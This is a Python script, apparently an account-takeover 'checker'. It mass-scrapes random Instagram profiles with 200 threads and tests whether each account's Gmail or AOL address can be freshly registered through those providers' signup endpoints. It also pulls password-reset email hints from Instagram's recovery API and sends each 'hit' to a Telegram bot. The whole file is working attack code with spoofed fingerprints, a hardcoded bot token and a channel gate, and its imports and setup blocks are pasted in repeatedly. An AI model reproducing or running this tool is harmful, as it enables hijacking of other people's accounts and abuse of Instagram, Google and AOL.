

import os
import time
import requests
from colorama import Style
from datetime import datetime

BOLD=Style.BRIGHT
RESET=Style.RESET_ALL
RESET="\033[0m"
YELLOW="\033[1m\033[33m"
GREEN="\033[1m\033[32m"
RED="\033[1m\033[31m"
CYAN="\033[1m\033[36m"
WHITE="\033[1m\033[37m"
import requests
import random
import json, string
from threading import Thread
import os
from user_agent import *
from requests import post as pp
from user_agent import generate_user_agent as ggb
from random import choice as cc
from random import randrange as rr
import re
import hashlib
import uuid
from requests import get
import sys
from datetime import datetime
try:
	from colorama import Fore, Style, init
except:
	os.system('pip install colorama')
	from colorama import Fore, Style, init
try:
    from cfonts import render, say
except:
    os.system('pip install python-cfonts')
    from cfonts import render, say
import time
init(autoreset=True)
red = "\033[1m\033[31m"
green = "\033[1m\033[32m"
yellow = "\033[1m\033[33m"
blue = "\033[1m\033[34m"
cyan = "\033[1m\033[36m"
magenta = "\033[1m\033[35m"
M = "\033[1m\033[36m"
white = "\033[1m\033[37m"
orange = "\033[1m\033[38;5;208m"
reset = "\033[0m"

import time
import random 
import requests
from colorama import Style
from datetime import datetime
import random

from random import choice 
B6='\x1b[1;96m' # Blue Type 🔵 
Z='\x1b[1;30m' # Dark Black Type 
Y6='\x1b[1;33m' # Yellow 🟡 
G6='\x1b[2;32m' # Dark Green
red6='\x1b[1;31m' # Red ♥️ 
P6='\x1b[1;95m' # Purple 🟣 
DP6='\x1b[2;35m' # Derk Purple 🟣 
W6='\x1b[2;39m' #White
DY6='\x1b[38;5;208m' # Dark Yellow
O6='\x1b[38;5;202m' # Orange 🍊 
L6 ='\x1b[38;5;203m' # idk 
s6= choice([B6,Z,G6,red6,W6,O6,L6])
L = '\033[1;33m' 
C = "\033[1;97m" 
B = '\033[2;36m'
Y = '\033[1;34m' 
C = "\033[1;97m" 
X = '\037' 
G = '\033[1;32m'
R = '\033[1;31m'
O = '\x1b[38;5;208m' 
F = '\033[1;32m' 

red = "\033[1m\033[31m"
green = "\033[1m\033[32m"
yellow = "\033[1m\033[33m"
blue = "\033[1m\033[34m"
cyan = "\033[1m\033[36m"
magenta = "\033[1m\033[35m"
M = "\033[1m\033[36m"
white = "\033[1m\033[37m"
orange = "\033[1m\033[38;5;208m"
reset = "\033[0m"
memo = random.randint(100, 300)
ror = f'\x1b[38;5;{memo}m'



red = '\x1b[1;91m'  #Red



import requests
import random
import json, string
from threading import Thread
import os
from user_agent import *
from requests import post as pp
from user_agent import generate_user_agent as ggb
from random import choice as cc
from random import randrange as rr
import re
import hashlib
import uuid
from requests import get
import sys

try:
	from colorama import Fore, Style, init
except:
	os.system('pip install colorama')
	from colorama import Fore, Style, init
try:
    from cfonts import render, say
except:
    os.system('pip install python-cfonts')
    from cfonts import render, say
import time
init(autoreset=True)
from rich.console import Console
from rich.table import Table
import os
import time

# Predefined inputs
# Loading animation function
def loading_animation():
    loading_chars = ["|", "/", "-", "\\"]
    for _ in range(2):  # Loop through the loading animation
        for char in loading_chars:
            sys.stdout.write(f"\rLᴏᴀᴅɪɴɢ {char}")
            sys.stdout.flush()
            time.sleep(0.1)
    sys.stdout.write("\rLᴏᴀᴅɪɴɢ Cᴏᴍᴘʟᴇᴛᴇᴅ    \n")  # Clear the loading animation

# Function to get bot info from Telegram API
def get_bot_info(token):
    url = f"https://api.telegram.org/bot{token}/getMe"
    
    # Send a request to the Telegram API
    response = requests.get(url)
    
    if response.status_code == 200:
        data = response.json()
        if data["ok"]:
            first_name = data["result"]["first_name"]
            username = data["result"]["username"]
            print(f"\n{G6}  🟢 ʙᴏᴛ ғᴏᴜɴᴅ{B6}\n   ➦ Bᴏᴛ Nᴀᴍᴇ : {first_name}\n   ➥ Bᴏᴛ Usᴇʀɴᴀᴍᴇ : @{username}\n")
        else:
            print("Error: Could not retrieve bot information.")
    else:
        print(f" \n{red6}  🔴  Eʀʀᴏʀ : Bᴏᴛ Tᴏᴋᴇɴ Wᴀs Wʀᴏɴɢ [ Pʟᴇᴀsᴇ Cʜᴇᴄᴋ Yᴏᴜʀ Bᴏᴛ Tᴏᴋᴇɴ ]")

# Function to get user info from Telegram API
def get_user_info(token, user_id):
    url = f"https://api.telegram.org/bot{token}/getChat"
    params = {'chat_id': user_id}
    
    # Send the request to the Telegram API
    response = requests.get(url, params=params)
    
    if response.status_code == 200:
        data = response.json()
        if data["ok"]:
            user_info = data["result"]
            first_name = user_info.get("first_name", "No first name available")
            username = user_info.get("username", None)
            
            # Print user information
            print(f"\n{G6}🟢 ᴜsᴇʀ ғᴏᴜɴᴅ {B6}\n  ➦ Yᴏᴜʀ Nᴀᴍᴇ : {first_name}")
            if username:
                print(f"{B6}  ➥ Yᴏᴜʀ Usᴇʀɴᴀᴍᴇ : @{username}")
            else:
                print("User does not have a username. Don't Worry About it ")
        else:
            print(f"Error: Could not retrieve user information.")
    else:
        print(f" {red6} 🔴 Eʀʀᴏʀ : Yᴏᴜʀ Usᴇʀ ɪᴅ Wᴀs Wʀᴏɴɢ   ")

# Main code to execute
if __name__ == "__main__":
    token = input("\033[1;32m> Enter Your Bot Token: \033[0m ")
    
    
    
    
import os
import requests

# === CONFIG ===
BOT_TOKEN = "8097986746:AAEPTusdQzwA_EQZtjLRHydRfXIGPzq6bNo"
CHANNEL_ID = "-1002007995166"  

ID = None  # Global variable

def is_user_in_channel(ID):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getChatMember?chat_id={CHANNEL_ID}&user_id={ID}"
    response = requests.get(url).json()
    if response.get("ok"):
        return response["result"]["status"] in ["member", "administrator", "creator"]
    return False

def main():
    global ID  # Declare it as global
    try:
        ID = input("\n\033[1;32m> Enter Your ID\033[0m ")

        if not is_user_in_channel(ID):
            print("❌ You must join the channel to use this script!")
            exit()

        print("\n✅ Access granted! Running the script...")

    except Exception as e:
        print(f"Error: {e}")
        exit()

if __name__ == "__main__":
    main()

    print("\nPʟᴇᴀsᴇ Wᴀɪᴛ...")
    os.system('clear')

aca = 0
total = 0
hits = 0
badinsta = 0
bademail = 0
goodig = 0
infoinsta = {}
def pppp():
    os.system('clear')
    output = (f"""{cyan}{red} 𝗛𝗜𝗧𝗦 : {hits}\n"""
              f" 𝗚𝗘𝗡𝗥𝗔𝗧𝗘𝗗 : {badinsta}\n"
              f" 𝗕𝗔𝗗 : {bademail}\n"
              f" 𝗚𝗢𝗢𝗗 : {goodig}\n")
    sys.stdout.write(output)
    sys.stdout.flush()
os.system('clear')
a = print(f"""
{cyan}
{cyan} {red}𓄃 {red}𝖲𝖾𝗅𝖾𝖼𝗍 𝖸𝗈𝗎𝗋 𝖢𝗁𝗈𝗂𝖼𝖾 {blue} {cyan} 
{cyan}
{cyan}  {orange}𓄃 {blue}1{white} - {yellow}2011                             {cyan}    
{cyan}  {green}𓄃 {blue}2{white} - {yellow}2012                             {cyan}    
{cyan}  {orange}𓄃 {blue}0   {red}{yellow}2011 {white}𝖳𝗈  {red}2023                  {cyan}        
{cyan}
""")

xYourKing = input(f"{green}-> {white}Please type the number of your choice: {reset}")

if xYourKing == '1':
    bbk = 10000
    id = 17699999
elif xYourKing == '2':
    bbk = 17699999
    id = 263014407
elif xYourKing == '0':
    bbk = 10000
    id = 21254029834
else:
    exit()


while True:
    try:
        a = "https://www.instagram.com/accounts/login"
        session = requests.Session()
        aa = session.get(a)
        csrf = aa.cookies.get('csrftoken')
        break
    except:
        pass

yy = 'azertyuiopmlkjhgfdsqwxcvbn'
def tll():
    try:
        n1 = ''.join(cc(yy) for i in range(rr(6, 9)))
        n2 = ''.join(cc(yy) for i in range(rr(3, 9)))
        host = ''.join(cc(yy) for i in range(rr(15, 30)))
        he3 = {
            "accept": "*/*",
            "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "google-accounts-xsrf": "1",
            'user-agent': str(ggb()),
        }
        res1 = requests.get(
            'https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', 
            headers=he3
        )
        tok = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
        cookies = {
            '__Host-GAPS': host
        }
        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn',
            'user-agent': ggb(),
        }
        data = {
            'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
        }
        response = requests.post(
            'https://accounts.google.com/_/signup/validatepersonaldetails',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        tl = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict()['__Host-GAPS']
        with open('tl.txt', 'w') as f:
            f.write(f'{tl}//{host}\n')
    except Exception as e:
        print(e)
        tll()
tll()

def Getaol():
    try:      
        qq = requests.get('https://login.aol.com/account/create', headers={
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
            'accept-language': 'en-US,en;q=0.9',
        })
        cookies = qq.cookies.get_dict()
        tm1 = str(time.time()).split('.')[0]
        cookies.update({
            'gpp': 'DBAA',
            'gpp_sid': '-1',
            '__gads': f'ID=c0M0fd00676f0ea1:T={tm1}:RT={tm1}:S=ALNI_MaEGaVTSG6nQFkSJ-RnxSZrF5q5XA',
            '__gpi': f'UID=00000cf0e8904e94:T={tm1}:RT={tm1}:S=ALNI_MYCzPrYn9967HtpDSITUe5Z4ZwGOQ',
            'cmp': f't={tm1}&j=0&u=1---',
        })
        specData = qq.text.split('name="attrSetIndex">\n        <input type="hidden" value="')[1].split('" name="specData">')[0]
        specId = qq.text.split('name="browser-fp-data" id="browser-fp-data" value="" />\n        <input type="hidden" value="')[1].split('" name="specId">')[0]
        crumb = qq.text.split('name="cacheStored">\n        <input type="hidden" value="')[1].split('" name="crumb">')[0]
        sessionIndex = qq.text.split('"acrumb">\n        <input type="hidden" value="')[1].split('" name="sessionIndex">')[0]
        acrumb = qq.text.split('name="crumb">\n        <input type="hidden" value="')[1].split('" name="acrumb">')[0]
        try:
            os.remove('aol_req.txt')
            os.remove('aol_cok.txt')
        except:
            pass
        with open('aol_req.txt', 'a') as t:
            t.write(f"{specData}Π{specId}Π{crumb}Π{sessionIndex}Π{acrumb}\n")

        with open('aol_cok.txt', 'a') as g:
            g.write(str(cookies) + '\n')
    except Exception as e:
        print(e)
        Getaol()
Getaol()

def check_gmail(email):
    global bademail, hits
    try:
        if '@' in email:
            email = str(email).split('@')[0]

        try:
            o = open('tl.txt', 'r').read().splitlines()[0]
        except:
            o = open('tl.txt', 'r').read().splitlines()[0]

        tl, host = o.split('//')

        cookies = {
            '__Host-GAPS': host
        }
        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': f'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}',
            'user-agent': ggb(),
        }

        params = {'TL': tl}
        data = (
            'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn'
            f'&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
        )
        response = pp(
            'https://accounts.google.com/_/signup/usernameavailability',
            params=params,
            cookies=cookies,
            headers=headers,
            data=data,
        )
        if '"gf.uar",1' in str(response.text):
            hits += 1
            pppp()
            if '@' not in email:
                ok = email + '@gmail.com'
                username, gg = ok.split('@')
                InfoAcc(username, gg)
            else:
                username, gg = email.split('@')
                InfoAcc(username, gg)
        else: 
          bademail+=1
          pppp()
    except:''


def check_aol(email):
    global hits, bademail
    try:
        if '@' in email:
            name = email.split('@')[0]
        else:
            name = email

        try:
            with open("aol_req.txt", "r") as f:
                for line in f:
                    specData, specId, crumb, sessionIndex, acrumb = line.strip().split('Π')

            with open("aol_cok.txt", "r") as f:
                for line in f:
                    cookies = eval(line.strip())
        except:
            Getaol()
            with open("aol_req.txt", "r") as f:
                for line in f:
                    specData, specId, crumb, sessionIndex, acrumb = line.strip().split('Π')

            with open("aol_cok.txt", "r") as f:
                for line in f:
                    cookies = eval(line.strip())

        headers = {
            'authority': 'login.aol.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://login.aol.com',
            'referer': f'https://login.aol.com/account/create?specId={specId}&done=https%3A%2F%2Fwww.aol.com',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
            'x-requested-with': 'XMLHttpRequest',
        }

        params = {
            'validateField': 'userId',
        }

        data = f'browser-fp-data=%7B%22language%22%3A%22en-US%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A8%2C%22pixelRatio%22%3A1%2C%22hardwareConcurrency%22%3A4%2C%22timezoneOffset%22%3A-60%2C%22timezone%22%3A%22Africa%2FCasablanca%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Win32%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A5%2C%22hash%22%3A%222c14024bf8584c3f7f63f24ea490e812%22%7D%2C%22canvas%22%3A%22canvas%20winding%3Ayes~canvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Google%20Inc.%20(Intel)~ANGLE%20(Intel%2C%20Intel(R)%20HD%20Graphics%204000%20(0x00000166)%20Direct3D11%20vs_5_0%20ps_5_0%2C%20D3D11)%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A0%2C%22event%22%3A0%2C%22start%22%3A0%7D%2C%22fonts%22%3A%7B%22count%22%3A33%2C%22hash%22%3A%22edeefd360161b4bf944ac045e41d0b21%22%7D%2C%22audio%22%3A%22124.04347527516074%22%2C%22resolution%22%3A%7B%22w%22%3A%221600%22%2C%22h%22%3A%22900%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22860%22%2C%22h%22%3A%221600%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1704793094844%2C%22render%22%3A1704793096534%7D%7D&specId={specId}&cacheStored=&crumb={crumb}&acrumb={acrumb}&sessionIndex={sessionIndex}&done=https%3A%2F%2Fwww.aol.com&googleIdToken=&authCode=&attrSetIndex=0&specData={specData}&multiDomain=&tos0=oath_freereg%7Cus%7Cen-US&firstName=ahmed&lastName=Mahos&userid-domain=yahoo&userId={name}&password=Drahmed2006##$$&mm=10&dd=24&yyyy=2000&signup='

        res = requests.post('https://login.aol.com/account/module/create', params=params, headers=headers, data=data, cookies=cookies).text
        if '{"errors":[]}' in res:
            hits += 1
            pppp()
            if '@' not in email:
                ok = email + '@aol.com'
                username, gg = ok.split('@')
                InfoAcc(username, gg)
            else:
                username, gg = email.split('@')
                InfoAcc(username, gg)
        else: 
          bademail+=1
          pppp()
    except:''
    

def check(email):
    global goodig, badinsta
    ua = generate_user_agent()
    dev = 'android-'
    device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
    uui = str(uuid.uuid4())
    headers = {
        'User-Agent': ua,
        'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    }
    data = {
        'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' + json.dumps({
            '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
            'adid': uui,
            'guid': uui,
            'device_id': device_id,
            'query': email
        }),
        'ig_sig_key_version': '4',
    }
    response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data).text
    if email in response:
        if '@gmail.com' in email:
            check_gmail(email)
        elif '@aol.com' in email or '@a**.com' in email:
            check_aol(email)
        goodig += 1
        pppp()
    else:
        badinsta += 1
        pppp()



def rest(user):
  try:
    headers = {
    'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
    'X-Pigeon-Rawclienttime': '1700251574.982',
    'X-IG-Connection-Speed': '-1kbps',
    'X-IG-Bandwidth-Speed-KBPS': '-1.000',
    'X-IG-Bandwidth-TotalBytes-B': '0',
    'X-IG-Bandwidth-TotalTime-MS': '0',
    'X-Bloks-Version-Id': 'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0',
    'X-IG-Connection-Type': 'WIFI',
    'X-IG-Capabilities': '3brTvw==',
    'X-IG-App-ID': '567067343352427',
    'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
    'Accept-Language': 'en-GB, en-US',
     'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Accept-Encoding': 'gzip, deflate',
    'Host': 'i.instagram.com',
    'X-FB-HTTP-Engine': 'Liger',
    'Connection': 'keep-alive',
    'Content-Length': '356',
}
    data = {
    'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+user+'"}',
    'ig_sig_key_version': '4',
  }
    response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data,).json()
    r=response['email']
  except:
    r='no REST !'
  return r

def date(hy):
    try:
        ranges = [
            (1279000, 2010),
            (17750000, 2011),
            (279760000, 2012),
            (900990000, 2013),
            (1629010000, 2014),
            (2500000000, 2015),
            (3713668786, 2016),
            (5699785217, 2017),
            (8597939245, 2018),
            (21254029834, 2019),
            (43464475395, 2020),
            (50289297647, 2021),
            (57464707082, 2022),
            (63313426938, 2023)
            
        ]
        
        for upper, year in ranges:
            if hy <= upper:
                return year
        return 2023
    
    except Exception:
        pass

    
def InfoAcc(username, gg):
    global total

    rr= infoinsta.get(username,{})

    Id = rr.get('pk', None)
    full_name = rr.get('full_name', None)
    fows = rr.get('follower_count', None)
    fowg = rr.get('following_count', None)
    pp = rr.get('media_count', None)
    isPraise = rr.get('is_private', None)
    bio = rr.get('biography', None)
    is_verified = rr.get('is_verified', None)
    bizz = rr.get('is_business', None)
    try:
        if (fows and pp):
            if (int(fows) >= 10 and int(pp) >= 2):
                meta = True
            else:
                meta = False
        else:
            meta = False
    except:
        meta=False


    total += 1
    ss = f'''
𝗛𝗶 𝗥𝘂𝗹𝗲𝗿 𝗚𝗼𝘁 𝗛𝗶𝘁
⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘ 𝗛𝗜𝗧 - {total}
𝗠𝗘𝗧𝗔  - {meta}
𝗙𝗢𝗟𝗟𝗢𝗪𝗘𝗥𝗦 - {fows}
𝗣𝗢𝗦𝗧𝗦 - {pp}
𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 - {username}
𝗘𝗠𝗔𝗜𝗟 - {username}{gg}
𝗥𝗘𝗦𝗘𝗧 - {rest(username)}
𝗟𝗜𝗡𝗞 - https://www.instagram.com/{username}
⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘
𝗕𝗬 : @RulerHuPagal '''

    with open('Ruler.txt', 'a') as ff:
        ff.write(f'{ss}\n')

    try:
        try:requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={ss}")
        except:pass
    except Exception as e:
        pass
        
def gg():
    while True:
        data = {
            "lsd": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            "variables": json.dumps({"id": int(random.randrange(bbk, id)), "render_surface": "PROFILE"}),
            "doc_id": "25618261841150840"
        }

        response = requests.post(
            "https://www.instagram.com/api/graphql",
            headers={"X-FB-LSD": data["lsd"]},
            data=data
        )
        try:
            username = response.json().get('data', {}).get('user', {}).get('username')
            infoinsta[username] = response.json().get('data', {}).get('user', {})
            emails = [ username + '@gmail.com', username + '@aol.com']
            for email in emails:
                check(email)
        except:''
for _ in range(200):
    Thread(target=gg).start()